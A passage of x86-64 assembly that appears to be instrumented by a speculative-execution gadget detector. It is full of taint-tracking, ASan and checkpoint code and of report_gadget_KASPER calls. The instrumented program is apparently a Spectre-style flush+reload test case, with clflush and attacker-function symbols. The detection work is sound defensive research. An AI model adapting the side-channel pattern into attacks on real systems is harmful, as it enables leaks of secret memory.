.L__asan_check__teapot___761:

            movq %rsi,%rdi
            shrq $3,%rdi
            movb 2147450880(%rdi),%dil
            testb %dil,%dil
            je .L__mem_operand_policy_done__teapot___761
.L__asan_check_fail__teapot___761:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___761
.L__asan_check_fail_attacker__teapot___761:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___761
.L__asan_check_fail_non_attacker__teapot___761:

            orb $2,(dift_reg_queued_tag)
            movb $12,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___761:

            nop
            leaq 32(%rsp),%r12
            btcq $45,%r12
            xorl %edi,%edi
            orb (dift_reg_tags+6),%dil
            orb (%r12),%dil
            movb %dil,(dift_reg_tags+12)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___762

            movb (dift_reg_queued_tag),%dil
            movzbq (dift_reg_queued_id),%rsi
            orb %dil,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___762:

            nop
            movq 32(%rsp),%r12
            xorl %edi,%edi
            orb (dift_reg_tags+12),%dil
            orb (dift_reg_tags+3),%dil
            movb %dil,(dift_reg_tags+12)
.L__dift_done__teapot___763:

            nop
            andq %rdx,%r12
            leaq 24(%rsp),%rdi
            xorq %rcx,%rcx
            orb (dift_reg_tags+6),%cl
            testb $48,%cl
            je .L__attacker_tags_check__teapot___764

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdi,%rsi
            movq %rcx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___764:

            testb $2,%cl
            je .L__asan_check__teapot___764

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdi,%rsi
            movq %rcx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__asan_check__teapot___764:

            movq %rdi,%rsi
            shrq $3,%rsi
            movb 2147450880(%rsi),%sil
            testb %sil,%sil
            je .L__mem_operand_policy_done__teapot___764
.L__asan_check_fail__teapot___764:

            testb $1,%cl
            je .L__asan_check_fail_non_attacker__teapot___764
.L__asan_check_fail_attacker__teapot___764:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rdi,%rsi
            movq %rcx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___764
.L__asan_check_fail_non_attacker__teapot___764:

            orb $2,(dift_reg_queued_tag)
            movb $2,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___764:

            nop
            leaq 24(%rsp),%rcx
            btcq $45,%rcx
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            orb (%rcx),%sil
            movb %sil,(dift_reg_tags+2)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___765

            movb (dift_reg_queued_tag),%sil
            movzbq (dift_reg_queued_id),%rdi
            orb %sil,(dift_reg_tags)(%rdi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___765:

            nop
            movq 24(%rsp),%rcx
            xorl %esi,%esi
            orb (dift_reg_tags),%sil
            orb (dift_reg_tags+2),%sil
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___766:

            nop
            andq %rax,%rcx
            xorl %esi,%esi
            orb (dift_reg_tags+12),%sil
            orb (dift_reg_tags+2),%sil
            movb %sil,(dift_reg_tags+12)
.L__dift_done__teapot___767:

            nop
            orq %rcx,%r12
            leaq 16(%rsp),%rsi
            xorq %rdi,%rdi
            orb (dift_reg_tags+6),%dil
            testb $48,%dil
            je .L__attacker_tags_check__teapot___768

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___768:

            testb $2,%dil
            je .L__asan_check__teapot___768

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__asan_check__teapot___768:

            movq %rsi,%rbx
            shrq $3,%rbx
            movb 2147450880(%rbx),%bl
            testb %bl,%bl
            je .L__mem_operand_policy_done__teapot___768
.L__asan_check_fail__teapot___768:

            testb $1,%dil
            je .L__asan_check_fail_non_attacker__teapot___768
.L__asan_check_fail_attacker__teapot___768:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___768
.L__asan_check_fail_non_attacker__teapot___768:

            orb $2,(dift_reg_queued_tag)
            movb $3,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___768:

            nop
            leaq 16(%rsp),%rdi
            btcq $45,%rdi
            xorl %ebx,%ebx
            orb (dift_reg_tags+6),%bl
            orb (dift_reg_tags+3),%bl
            orb (%rdi),%bl
            movb %bl,(dift_reg_tags+3)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___769

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rsi
            orb %bl,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___769:

            nop
            andq 16(%rsp),%rdx
            leaq 8(%rsp),%rsi
            xorq %rdi,%rdi
            orb (dift_reg_tags+6),%dil
            testb $48,%dil
            je .L__attacker_tags_check__teapot___770

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___770:

            testb $2,%dil
            je .L__asan_check__teapot___770

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___770:

            movq %rsi,%rbx
            shrq $3,%rbx
            movb 2147450880(%rbx),%bl
            testb %bl,%bl
            je .L__mem_operand_policy_done__teapot___770
.L__asan_check_fail__teapot___770:

            testb $1,%dil
            je .L__asan_check_fail_non_attacker__teapot___770
.L__asan_check_fail_attacker__teapot___770:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rsi,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___770
.L__asan_check_fail_non_attacker__teapot___770:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___770:

            nop
            leaq 8(%rsp),%rdi
            btcq $45,%rdi
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            orb (dift_reg_tags+6),%bl
            orb (%rdi),%bl
            movb %bl,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___771

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rsi
            orb %bl,(dift_reg_tags)(%rsi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___771:

            nop
            andq 8(%rsp),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+3),%sil
            movb %sil,(dift_reg_tags+1)
.L__dift_done__teapot___772:

            nop
            movq %rdx,%rbx
            xorl %edx,%edx
            orb (dift_reg_tags),%dl
            orb (dift_reg_tags+1),%dl
            movb %dl,(dift_reg_tags+1)
.L__dift_done__teapot___773:

            nop
            orq %rax,%rbx
            xorl %edx,%edx
            movb %dl,(dift_reg_tags+3)
.L__dift_done__teapot___774:

            nop
            movl $256,%edx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___775:

            nop
            movl $4096,%esi
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            orb (dift_reg_tags+15),%dil
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___776:

            nop
            movq (scratchpad+524288),%rax
            movq %r15,%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $21,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            callq flush_lines__teapot__
.L__ret_transform_target_attacker_function__a443664a_f1ad_4fd9_a559_5be26ad24f64__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $26,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            clflush (array_size)(%rip)
            xorl %edi,%edi
            orb (dift_reg_tags+13),%dil
            testb $48,%dil
            je .L__check_ok__teapot___780

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rdi,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___780:

            nop
            movq (instruction_cnt),%rdi
            addq $3,%rdi
            cmpq $250,%rdi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rdi,(instruction_cnt)
            cmpq $31,%r13
            leaq (.__trampoline__0fb98d1e_c46e_40b6_a492_bc4dd330d8a3__teapot__)(%rip),%r13
            movq %r13,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___782)(%rip),%r13
            movq %r13,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__0fb98d1e_c46e_40b6_a492_bc4dd330d8a3__teapot__)(%rip),%r13
            movq %r13,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___782:

            nop
            jne .L_19fe__teapot__
.L__trampoline_target__f5d48e9c_155d_40e4_b21e_ff02e865f439__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $35,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq 40(%rsp),%r13
            xorq %rax,%rax
            orb (dift_reg_tags+6),%al
            testb $48,%al
            je .L__attacker_tags_check__teapot___784

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___784:

            testb $2,%al
            je .L__asan_check__teapot___784

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___784:

            movq %r13,%rdi
            shrq $3,%rdi
            movb 2147450880(%rdi),%dil
            testb %dil,%dil
            je .L__mem_operand_policy_done__teapot___784
.L__asan_check_fail__teapot___784:

            testb $1,%al
            je .L__asan_check_fail_non_attacker__teapot___784
.L__asan_check_fail_attacker__teapot___784:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r13,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___784
.L__asan_check_fail_non_attacker__teapot___784:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___784:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            leaq 40(%rsp),%rax
            btcq $45,%rax
            xorl %edi,%edi
            orb (dift_reg_tags+6),%dil
            orb (%rax),%dil
            movb %dil,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___785

            movb (dift_reg_queued_tag),%dil
            movzbq (dift_reg_queued_id),%r13
            orb %dil,(dift_reg_tags)(%r13)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___785:

            nop
            movq (scratchpad+524288),%rax
            movq 40(%rsp),%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%r13
            movq %rbx,(%rax)
            movq %r13,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq free@PLT
.L__ret_transform_target_attacker_function__2e9de1b0_585c_40d0_8ab4_6120d11623c7__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $42,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rsi
            addq $1,%rsi
            cmpq $250,%rsi
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rsi,(instruction_cnt)
            jmp .L_19fe__teapot__
.L_1a9b__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $49,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            movb %sil,(dift_reg_tags+1)
.L__dift_done__teapot___791:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 96(%rsp),%rbx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            movb %sil,(dift_reg_tags+5)
.L__dift_done__teapot___792:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            leaq 2151(%rsp),%rdi
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___793:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $256,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___794:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rbx,%rsi
            leaq -8(%rsp),%r13
            movq (memory_history_top),%r12
            movq (%r13),%rbp
            movq %r13,(%r12)
            movq %rbp,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $5,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            callq decode_flush_reload_state__teapot__
.L__ret_transform_target_attacker_function__17d14e56_80cb_4e8d_a489_136d21f4f9e1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $54,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+2)
.L__dift_done__teapot___798:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $256,%ecx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___799:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $0,%eax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+1),%sil
            movb %sil,(dift_reg_tags+5)
.L__dift_done__teapot___800:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $3,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movq %rbx,%rdi

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $63,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq (%rdi),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r13
            movq %rsi,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            rep stosq (%rdi)

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $21,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___806:

            nop
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            movl $1,%edx
            movq %rax,(scratchpad+524296)
            lahf 
            seto %al
            movq %rax,(scratchpad+524288)
            movq (scratchpad+524296),%rax
            movq (instruction_cnt),%r12
            addq $2,%r12
            cmpq $250,%r12
            jge restore_checkpoint_ROB_LEN@PLT

            movq %r12,(instruction_cnt)
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524288),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524296),%rax
            jmp .L_18e1__teapot__
.L_1acf__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $31,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            movb %sil,(dift_reg_tags+3)
.L__dift_done__teapot___809:

            nop
            leaq 2151(%rsp),%rdx
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___810:

            nop
            leaq (.L_2074)(%rip),%rsi
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags+5)
.L__dift_done__teapot___811:

            nop
            movl $1,%edi
            xorl %r14d,%r14d
            movb %r14b,(dift_reg_tags)
.L__dift_done__teapot___812:

            nop
            movl $0,%eax
            leaq -8(%rsp),%r14
            movq (memory_history_top),%r12
            movq (%r14),%r13
            movq %r14,(%r12)
            movq %r13,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __printf_chk__dift_wrapper__@PLT
.L__ret_transform_target_attacker_function__13b3779c_7e9b_497c_8dd8_ff2fcc636f0e__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $38,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___816:

            nop
            movl $1048576,%esi
            xorl %r14d,%r14d
            orb (dift_reg_tags+15),%r14b
            movb %r14b,(dift_reg_tags+5)
.L__dift_done__teapot___817:

            nop
            movq %r15,%rdi
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq munmap@PLT
.L__ret_transform_target_attacker_function__5ac66119_87dd_4238_aef1_89b82b8fe153__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $57,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq 88(%rsp),%r15
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___821

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___821:

            testb $2,%r12b
            je .L__asan_check__teapot___821

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__asan_check__teapot___821:

            movq %r15,%r14
            shrq $3,%r14
            movb 2147450880(%r14),%r14b
            testb %r14b,%r14b
            je .L__mem_operand_policy_done__teapot___821
.L__asan_check_fail__teapot___821:

            testb $1,%r12b
            je .L__asan_check_fail_non_attacker__teapot___821
.L__asan_check_fail_attacker__teapot___821:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___821
.L__asan_check_fail_non_attacker__teapot___821:

            orb $2,(dift_reg_queued_tag)
            movb $5,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___821:

            nop
            leaq 88(%rsp),%r12
            btcq $45,%r12
            xorl %r14d,%r14d
            orb (dift_reg_tags+6),%r14b
            orb (%r12),%r14b
            movb %r14b,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___822

            movb (dift_reg_queued_tag),%r14b
            movzbq (dift_reg_queued_id),%r15
            orb %r14b,(dift_reg_tags)(%r15)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___822:

            nop
            movq 88(%rsp),%rdi
            leaq -8(%rsp),%r15
            movq (memory_history_top),%r12
            movq (%r15),%r14
            movq %r15,(%r12)
            movq %r14,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq free@PLT
.L__ret_transform_target_attacker_function__83be127e_d615_4a37_9c06_e378055b2db2__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $58,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq 72(%rsp),%r15
            xorq %r12,%r12
            orb (dift_reg_tags+6),%r12b
            testb $48,%r12b
            je .L__attacker_tags_check__teapot___826

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %r15,%rsi
            movq %r12,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
